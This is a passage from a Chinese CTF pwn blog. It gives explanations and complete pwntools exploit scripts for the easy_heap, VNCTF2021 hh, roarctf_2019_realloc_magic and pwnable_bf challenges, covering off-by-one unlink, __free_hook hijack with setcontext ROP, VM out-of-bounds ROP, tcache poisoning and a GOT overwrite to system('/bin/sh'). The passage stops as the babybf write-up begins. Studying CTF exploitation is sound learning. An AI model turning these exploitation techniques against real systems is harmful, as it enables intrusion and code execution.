consolidating&quot;</span>);<br>      unlink_chunk (av, p);<br>    &#125;      <br></code></pre></td></tr></table></figure><p>这种高版本的off-by-one总结如下：</p><ol><li>让合并的chunk的size与伪造的prev_size相等，才能通过检查，但修改正常chunk的size是不可能的，所以在chunk中去伪造另一个chunk即可；</li><li>由于堆块的合并还要通过unlink的检查，main_arena和bss中一般并不存在我们伪造chunk的地址（当然有PIE保护也就不用考虑bss），所以需要先去泄漏堆地址，我们自己在堆上写入伪造chunk的地址；</li><li>与以前unlink攻击的思路一样，伪造chunk的fd和bk也是需要与我们写入的地址相对应的。</li></ol><p>具体构造如下：</p><img src="/img/8/Screenshot_20230101_022934.png" style="zoom: 67%;" /><p>​                                                 </p><p>程序开了沙盒，在<code>__free_hook</code>中写入rdi与rdx转化的gedget，再与<code>setcontext</code>函数相结合劫持rsp到堆上，最后直接ROP或者使用mprotect后写入shellcode</p><p>​                                                                                        </p><p>完整的exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;easy_heap&#x27;</span>)<br>libc = elf.libc<br><span class="hljs-comment">#p = process(&#x27;./easy_heap&#x27;)</span><br>p = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">27074</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Choice:&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Size:&#x27;</span>, <span class="hljs-built_in">str</span>(size).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index, content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Choice:&#x27;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index:&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;Content:&#x27;</span>, content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Choice:&#x27;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index:&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Choice:&#x27;</span>, <span class="hljs-string">b&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index:&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br><br>add(<span class="hljs-number">0x410</span>)<br>add(<span class="hljs-number">0x10</span>)<br>delete(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0x420</span>)<span class="hljs-comment">#本来是想通过large chunk一次性泄漏libc地址和堆地址, 但edit会引入&#x27;\x00&#x27;，最后改为tcache泄漏堆地址</span><br>add(<span class="hljs-number">0x130</span>)<br>show(<span class="hljs-number">2</span>)<br>leak = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libcbase = leak - <span class="hljs-number">1104</span> - <span class="hljs-number">0x10</span> - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br><br>add(<span class="hljs-number">0x10</span>)<br>delete(<span class="hljs-number">1</span>)<br>delete(<span class="hljs-number">3</span>)<br>add(<span class="hljs-number">0x18</span>)<br>show(<span class="hljs-number">1</span>)<span class="hljs-comment">#重新申请后tcache指针依然残留，进而泄漏堆地址</span><br>p.recvuntil(<span class="hljs-string">b&#x27;Content: &#x27;</span>)<br>heap_addr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x6c0</span><br><br>add(<span class="hljs-number">0x110</span>)<br>payload1 = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0xf0</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x21</span>)<br>edit(<span class="hljs-number">3</span>, payload1)<br>payload2 = p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + p64(heap_addr + <span class="hljs-number">0x2a0</span> + <span class="hljs-number">0x20</span>) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x131</span>) + p64(heap_addr + <span class="hljs-number">0x2a0</span>) + p64(heap_addr + <span class="hljs-number">0x2a0</span> + <span class="hljs-number">8</span>)<br>edit(<span class="hljs-number">2</span>, payload2)<span class="hljs-comment">#伪造堆块</span><br>payload3 = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x10</span> + p64(<span class="hljs-number">0x130</span>)<br>edit(<span class="hljs-number">1</span>, payload3)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    add(<span class="hljs-number">0xf0</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>, <span class="hljs-number">11</span>):<br>    delete(i)<br>delete(<span class="hljs-number">3</span>)<br>add(<span class="hljs-number">0x100</span>)<br>add(<span class="hljs-number">0x10</span>)<br>add(<span class="hljs-number">0x10</span>)<br>delete(<span class="hljs-number">4</span>)<br>delete(<span class="hljs-number">5</span>)<br><br>free_hook = libcbase + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>setcontext = libcbase + libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>]<br>magic_gadget = libcbase + <span class="hljs-number">0x154b90</span><br>pop_rdi = libcbase + <span class="hljs-number">0x26bb2</span><br>pop_rsi = libcbase + <span class="hljs-number">0x2709c</span><br>pop_rdx_r12 = libcbase + <span class="hljs-number">0x11c421</span><br>ret = libcbase + <span class="hljs-number">0x256b9</span><br>mprotect = libcbase + libc.sym[<span class="hljs-string">&#x27;mprotect&#x27;</span>]<br><br>edit(<span class="hljs-number">1</span>, p64(free_hook))<br>add(<span class="hljs-number">0x10</span>)<br>add(<span class="hljs-number">0x10</span>)<br>edit(<span class="hljs-number">5</span>, p64(magic_gadget))<br><br>payload = p64(<span class="hljs-number">0</span>) + p64(heap_addr + <span class="hljs-number">0x6e0</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">2</span> + p64(setcontext + <span class="hljs-number">61</span>)<br>payload = payload.ljust(<span class="hljs-number">0xa0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload += p64(heap_addr + <span class="hljs-number">0x6e0</span> + <span class="hljs-number">0x100</span>) + p64(ret)<br>payload = payload.ljust(<span class="hljs-number">0x100</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload += p64(pop_rdi) + p64(heap_addr) + p64(pop_rsi) + p64(<span class="hljs-number">0x1000</span>) + p64(pop_rdx_r12) + p64(<span class="hljs-number">7</span>) + p64(<span class="hljs-number">0</span>) + p64(mprotect)<br>payload += p64(heap_addr + <span class="hljs-number">0x6e0</span> + <span class="hljs-number">0x150</span>)<br>payload = payload.ljust(<span class="hljs-number">0x150</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload += asm(shellcraft.cat(<span class="hljs-string">&#x27;flag&#x27;</span>))<br><br>edit(<span class="hljs-number">0</span>, payload)<br>delete(<span class="hljs-number">0</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><p>​                                                                 </p><p>​                                                                                        </p><h3 id="VNCTF2021-hh"><a href="#VNCTF2021-hh" class="headerlink" title="VNCTF2021 hh"></a>VNCTF2021 hh</h3><p>vmpwn类型的题，指令和操作数都是4个字节，主要使用如下指令：</p><img src="/img/8/Screenshot_20230101_041533.png" style="zoom:67%;" /><p>​</p><p>利用思路：</p><ol><li>v32存在于栈上，执行指令<code>0xb  n</code>时会造成数组越界，可以将栈上其它的内容写入v32数组，再配合指令<code>0xe</code>就可以泄漏栈地址和<code>__libc_start_main</code>地址；</li><li>指令<code>0x9  n</code>可以在v32数组上写入任何数，再配合指令<code>0xd  n</code>，同样是数组越界将v32数组的内容写入到栈上其它地方，当然这里直接写入函数返回地址，执行ROP。</li></ol><p>​                                                            </p><p>完整exp如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;hh&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;libc.so.6&#x27;</span>)<br>p = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="hljs-number">27244</span>)<br><span class="hljs-comment">#p = process(&#x27;./hh&#x27;)</span><br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sendgadget</span>(<span class="hljs-params">gadget</span>):<br>    l = <span class="hljs-built_in">len</span>(gadget) // <span class="hljs-number">4</span><br>    gadget = <span class="hljs-built_in">int</span>.from_bytes(gadget, byteorder=<span class="hljs-string">&#x27;little&#x27;</span>, signed=<span class="hljs-literal">True</span>)<br>    result = <span class="hljs-string">b&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(l):<br>        t = gadget &amp; <span class="hljs-number">0xffffffff</span><br>        result += p32(<span class="hljs-number">9</span>) + p32(t) + p32(<span class="hljs-number">0xd</span>) + p32(<span class="hljs-number">0x7d6</span> + i)<br>        gadget = gadget &gt;&gt; <span class="hljs-number">32</span><br>    <span class="hljs-keyword">return</span> result<br><br>p.sendlineafter(<span class="hljs-string">b&#x27;choice :&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>code = p32(<span class="hljs-number">11</span>) + p32(<span class="hljs-number">0x7d4</span>) + p32(<span class="hljs-number">11</span>) + p32(<span class="hljs-number">0x7d5</span>) + p32(<span class="hljs-number">11</span>) + p32(<span class="hljs-number">0x7d6</span> + <span class="hljs-number">8</span>) + p32(<span class="hljs-number">11</span>) + p32(<span class="hljs-number">0x7d7</span> + <span class="hljs-number">8</span>)<br>code += p32(<span class="hljs-number">0xe</span>) * <span class="hljs-number">4</span><br>p.sendafter(<span class="hljs-string">b&#x27;code:&#x27;</span>, code)<br>p.sendlineafter(<span class="hljs-string">b&#x27;choice :&#x27;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)<br><br>leak1 =  <span class="hljs-built_in">int</span>(p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>, drop=<span class="hljs-literal">True</span>), <span class="hljs-number">16</span>) &lt;&lt; <span class="hljs-number">32</span><br>leak2 = leak1 + <span class="hljs-built_in">int</span>(p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>, drop=<span class="hljs-literal">True</span>), <span class="hljs-number">16</span>)<br>leak3 =  <span class="hljs-built_in">int</span>(p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>, drop=<span class="hljs-literal">True</span>), <span class="hljs-number">16</span>) &lt;&lt; <span class="hljs-number">32</span><br>stack = leak3 + <span class="hljs-built_in">int</span>(p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>, drop=<span class="hljs-literal">True</span>), <span class="hljs-number">16</span>)<br>libcbase = leak2  - <span class="hljs-number">240</span> - libc.sym[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]<br>pop_rdi = libcbase + <span class="hljs-number">0x21112</span><br>pop_rsi = libcbase + <span class="hljs-number">0x202f8</span><br>pop_rdx = libcbase + <span class="hljs-number">0x1b92</span><br>pop_rax = libcbase + <span class="hljs-number">0x3a738</span> <br>ret = libcbase + <span class="hljs-number">0x937</span><br>syscall_ret = libcbase + <span class="hljs-number">0xbc3f5</span><br><br><br>p.sendlineafter(<span class="hljs-string">b&#x27;choice :&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>payload = flat(<br>    p64(pop_rdi), p64(stack + <span class="hljs-number">0xb0</span>),<br>    p64(pop_rsi), p64(<span class="hljs-number">0</span>),<br>    p64(pop_rax), p64(<span class="hljs-number">2</span>),<br>    p64(syscall_ret),<br><br>    p64(pop_rdi), p64(<span class="hljs-number">3</span>),<br>    p64(pop_rsi), p64(stack + <span class="hljs-number">0x100</span>),<br>    p64(pop_rdx), p64(<span class="hljs-number">0x30</span>),<br>    p64(pop_rax), p64(<span class="hljs-number">0</span>),<br>    p64(syscall_ret),<br><br>    p64(pop_rdi), p64(<span class="hljs-number">1</span>),<br>    p64(pop_rsi), p64(stack + <span class="hljs-number">0x100</span>),<br>    p64(pop_rdx), p64(<span class="hljs-number">0x30</span>),<br>    p64(pop_rax), p64(<span class="hljs-number">1</span>),<br>    p64(syscall_ret)<br>)<br>payload += <span class="hljs-string">b&#x27;flag&#x27;</span><br>code = sendgadget(payload)<br>p.sendafter(<span class="hljs-string">b&#x27;code:&#x27;</span>, code)<br>p.sendlineafter(<span class="hljs-string">b&#x27;choice :&#x27;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="roarctf-2019-realloc-magic"><a href="#roarctf-2019-realloc-magic" class="headerlink" title="roarctf_2019_realloc_magic"></a>roarctf_2019_realloc_magic</h3><p>Roderick师傅的<a href="https://roderickchan.github.io/2021/03/28/roarctf-2019-realloc-magic/">这篇</a>已经写得很好了，还需要注意的是使用realloc函数，在扩大内存时，并且tcache中正好有该大小的chunk，这时也并不会去使用tcache中的chunk。</p><p>​                         </p><p>自己复现的exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;roarctf_2019_realloc_magic&#x27;</span>)<br>libc = elf.libc<br><span class="hljs-comment">#p = process(&#x27;./roarctf_2019_realloc_magic&#x27;)</span><br><span class="hljs-keyword">global</span> p<br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">realloc</span>(<span class="hljs-params">size, content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&gt; &#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Size?&#x27;</span>, <span class="hljs-built_in">str</span>(size).encode())<br>    <span class="hljs-keyword">if</span> size != <span class="hljs-number">0</span>:<br>        p.sendafter(<span class="hljs-string">b&#x27;Content?&#x27;</span>, content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>():<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&gt; &#x27;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pwn</span>():<br>    realloc(<span class="hljs-number">0x20</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>    realloc(<span class="hljs-number">0</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>    realloc(<span class="hljs-number">0xa0</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>    realloc(<span class="hljs-number">0x80</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>        free()<br>    realloc(<span class="hljs-number">0</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>    realloc(<span class="hljs-number">0x20</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>    realloc(<span class="hljs-number">0x40</span>, <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x20</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x81</span>) + <span class="hljs-string">b&#x27;\x60\xc7&#x27;</span>)<br>    realloc(<span class="hljs-number">0</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>    realloc(<span class="hljs-number">0x80</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>    realloc(<span class="hljs-number">0</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>    realloc(<span class="hljs-number">0x80</span>, p64(<span class="hljs-number">0xfbad1800</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    leak =  u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>, timeout=<span class="hljs-number">1</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>    libcbase = leak - <span class="hljs-number">4118704</span><br>    free_hook = libcbase + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>    onegadget = libcbase + <span class="hljs-number">0x4f322</span><br><br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&gt; &#x27;</span>, <span class="hljs-string">b&#x27;666&#x27;</span>)<br>    realloc(<span class="hljs-number">0x30</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>    realloc(<span class="hljs-number">0</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>    realloc(<span class="hljs-number">0xa0</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>    realloc(<span class="hljs-number">0x80</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>):<br>        free()<br>    realloc(<span class="hljs-number">0</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>    realloc(<span class="hljs-number">0x30</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>    realloc(<span class="hljs-number">0x50</span>, <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x30</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x81</span>) + p64(free_hook))<br>    realloc(<span class="hljs-number">0</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>    realloc(<span class="hljs-number">0x80</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>    realloc(<span class="hljs-number">0</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>    realloc(<span class="hljs-number">0x80</span>, p64(onegadget))<br>    free()<br>    p.interactive()<br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-keyword">try</span> :<br>        p = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">28369</span>)<br>        pwn()<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        p.close()<br></code></pre></td></tr></table></figure><p>​                                                 </p><p>​                                            </p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>bf解释器</title>
    <link href="/2022/12/12/bf%E8%A7%A3%E9%87%8A%E5%99%A8/"/>
    <url>/2022/12/12/bf%E8%A7%A3%E9%87%8A%E5%99%A8/</url>
    
    <content type="html"><![CDATA[<p>最近在强网拟态和安洵杯上都出现了bf解释器的题，自己还是头一回见，在此学习一下。</p><p>Brainfuck，简称BF，是一种极小化的程序语言</p><img src="/img/7/Screenshot_20221230_014458.png" style="zoom: 67%;" /><h3 id="pwnable-bf"><a href="#pwnable-bf" class="headerlink" title="pwnable_bf"></a>pwnable_bf</h3><p>首先看一道pwnable_bf（buu和pwnable.kr上都有）</p><p>其主函数中全局变量p指向全局变量tape的地址，输入一段字符后就让每个字符进入do_brainfuck函数：</p><img src="/img/7/Screenshot_20221230_014948.png" style="zoom: 80%;" /><p>​                                  </p><p>在do_brainfuck函数中就是对指针p的操作，每一个字符实际上就对应了bf解释器的操作；漏洞也很明显，就是指针p对应tape的地址的变化没有做出限制，这就让指针p指向got表：</p><img src="/img/7/Screenshot_20221230_015016.png" style="zoom: 80%;" /><p>​                                                        </p><p>泄漏地址libc地址后可以继续使用的就只有putchar函数和getchar函数，由于对got表的读写都只能是一字节，getchar函数对自己的got表修改到一半就会先失效，所以只能修改putchar函数的got表；而putchar函数的参数只能是一个字节，无法完成”&#x2F;bin&#x2F;sh”的调用，所以修改putchar函数为_start、memset函数为gets函数、fgets函数为system函数即可。</p><p>完整的exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;bf&#x27;</span>)<br><span class="hljs-comment">#libc = elf.libc</span><br>libc = ELF(<span class="hljs-string">&#x27;libc-2.23.so&#x27;</span>)<br><span class="hljs-comment">#p = process(&#x27;./bf&#x27;)</span><br>p = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="hljs-number">25595</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getchar</span>(<span class="hljs-params">gadget</span>):<br>    l = <span class="hljs-built_in">len</span>(gadget)<br>    gadget = <span class="hljs-built_in">int</span>.from_bytes(gadget, byteorder=<span class="hljs-string">&#x27;little&#x27;</span>, signed=<span class="hljs-literal">True</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(l):<br>        t = gadget &amp; <span class="hljs-number">0xff</span><br>        gadget = gadget &gt;&gt; <span class="hljs-number">8</span><br>        p.send(p8(t))<br><br>payload = <span class="hljs-string">b&#x27;&lt;&#x27;</span> * <span class="hljs-number">0x7c</span>  + <span class="hljs-string">b&#x27;.&gt;&#x27;</span> * <span class="hljs-number">4</span>  <span class="hljs-comment">#泄漏__libc_start_main的地址</span><br>payload += <span class="hljs-string">b&#x27;&lt;&#x27;</span> * <span class="hljs-number">24</span> + <span class="hljs-string">b&#x27;,&gt;&#x27;</span> * <span class="hljs-number">4</span> <span class="hljs-comment">#修改fgets函数的地址</span><br>payload += <span class="hljs-string">b&#x27;&gt;&#x27;</span> * <span class="hljs-number">24</span> + <span class="hljs-string">b&#x27;,&gt;&#x27;</span> * <span class="hljs-number">8</span><span class="hljs-comment">#修改memset函数和putchar函数</span><br>payload += <span class="hljs-string">b&#x27;.&#x27;</span><span class="hljs-comment">#调用putchar函数</span><br>p.sendlineafter(<span class="hljs-string">b&#x27;[ ]&#x27;</span>, payload)<br>leak = u32(p.recvuntil(<span class="hljs-string">b&#x27;\xf7&#x27;</span>)[-<span class="hljs-number">4</span>:])<br><br>libcbase = leak - libc.sym[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]<br>sys_addr = libcbase + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>gets = libcbase + libc.sym[<span class="hljs-string">&#x27;gets&#x27;</span>]<br><br>getchar(p32(sys_addr))<br>getchar(p32(gets))<br>getchar(p32(<span class="hljs-number">0x80484e0</span>))<br><br>p.sendline(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="安洵杯babybf"><a href="#安洵杯babybf" class="headerlink" title="安洵杯babybf"></a>安洵杯babybf</h3><p>本地环境：2.27-3ubuntu1.6_amd64</p><p>安洵杯的这道题很抽象</p><h4 id="v3数组"><a href="#v3数组" class="headerlink" title="v3数组"></a>v3数组</h4><p>函数sub_142F的开头就是一些函数赋值给v3数组，这些函数直接去看是完全不知道其意义，所以边调试边去阅读可以很好得帮助理解。</p><p>函数栈的排布如下：</p><img src="/img/7/Screenshot_20221230_032525.jpg" style="zoom: 67%;" /><p>​                                                                                        </p><p>这里以函数sub_16F6为例子</p><img src="/img/7/Screenshot_20221230_040603.png" style="zoom: 67%;" 